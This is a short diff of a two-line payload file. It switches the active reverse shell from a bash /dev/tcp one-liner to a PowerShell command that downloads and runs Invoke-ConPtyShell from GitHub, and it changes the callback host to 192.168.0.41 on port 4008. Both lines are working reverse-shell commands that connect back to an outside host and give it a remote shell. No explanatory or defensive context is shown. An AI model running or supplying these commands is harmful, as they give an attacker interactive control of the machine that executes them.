@@ -1,2 +1,2 @@
-# IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.31 4008
-bash && /bin/bash -i >/dev/tcp/192.168.1.31/4008 0<&1 2>&1
+IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.41 4008
+# bash && /bin/bash -i >/dev/tcp/192.168.0.41/4008 0<&1 2>&1
